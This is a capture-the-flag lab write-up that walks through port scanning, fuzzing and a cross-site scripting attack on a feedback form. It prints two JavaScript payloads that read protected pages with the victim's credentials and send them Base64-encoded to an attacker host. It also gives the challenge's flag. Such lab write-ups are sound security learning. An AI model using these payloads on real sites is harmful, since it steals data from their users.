# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | ssh |
| 8080 | http |

We got two open ports, `ssh` and `http` on port `8080`, let's take a look at the website:

![Pasted image 20241202124915.png](../../IMAGES/Pasted%20image%2020241202124915.png)

Let's check source code:


![Pasted image 20241202124936.png](../../IMAGES/Pasted%20image%2020241202124936.png)

Nothing useful, let's try to fuzz in order to find anything useful:



## FUZZING
---

![Pasted image 20241202125736.png](../../IMAGES/Pasted%20image%2020241202125736.png)

Found a `/view_feedbacK` directory, it has status code `401` which means we are not authorized to read it, so, we need to be able to perform some sort of privilege escalation to be able to read it.

# RECONNAISSANCE
---
if we take a look at the feedback, we are able to see the following:

![Pasted image 20241202130251.png](../../IMAGES/Pasted%20image%2020241202130251.png)

seems like a simple feedback form, but I believe this is vulnerable to XSS, so, let's try to craft a payload to get the contents of the home page to check if it's either vulnerable or not.




# EXPLOITATION
---


As said, this will be our payload:

```js
<script> 
fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'}) 
.then(response => response.text()) 
.then(text => { 
fetch('http://IP:80/' + btoa(text), {mode:'no-cors'}); 
}); 
</script>
```

```ad-note
#### Breakdown of the code:

- `fetch("/")`: Requests the home page's content.
- `btoa(text)`: Encodes the content in Base64 to safely transmit it.
- `fetch('http://your_ip:80')`: Sends the encoded data to your server.
```

Let's start a python server and check if it works:

![Pasted image 20241202130611.png](../../IMAGES/Pasted%20image%2020241202130611.png)

After sending the payload, we receive the contents of the page we have requested, in this case, home page, if we try decoding that, we get the following:


![Pasted image 20241202130742.png](../../IMAGES/Pasted%20image%2020241202130742.png)


As shown, we successfully exploited [XSS](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/CROSS%20SITE%20SCRIPTING/CROSS%20SITE%20SCRIPTING%20(XSS).md)and got the contents of the home page, right now, we can take other exploitations paths, such as trying to get a reverse shell and some other, to make this CTF simple, let's just use a payload that retrieves the contents of `http://10.10.133.79:8080/flag.txt`, since this is the file we want to read anyway.


# READING THE FILE
---


```js
<script> 
fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'}) 
.then(response => response.text()) 
.then(text => { 
fetch('http://10.6.34.159:9001/' + btoa(text), {mode:'no-cors'}); 
}); 
</script>
```

This payload does the same as the previous one, it just targets that `flag.txt` file, let's send it and get our base64 encoded flag:

![Pasted image 20241202131136.png](../../IMAGES/Pasted%20image%2020241202131136.png)

Nice, let's decode:

![Pasted image 20241202131156.png](../../IMAGES/Pasted%20image%2020241202131156.png)

We got the flag and finished the CTF, Gg!

```ad-hint

Flag: `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`
```


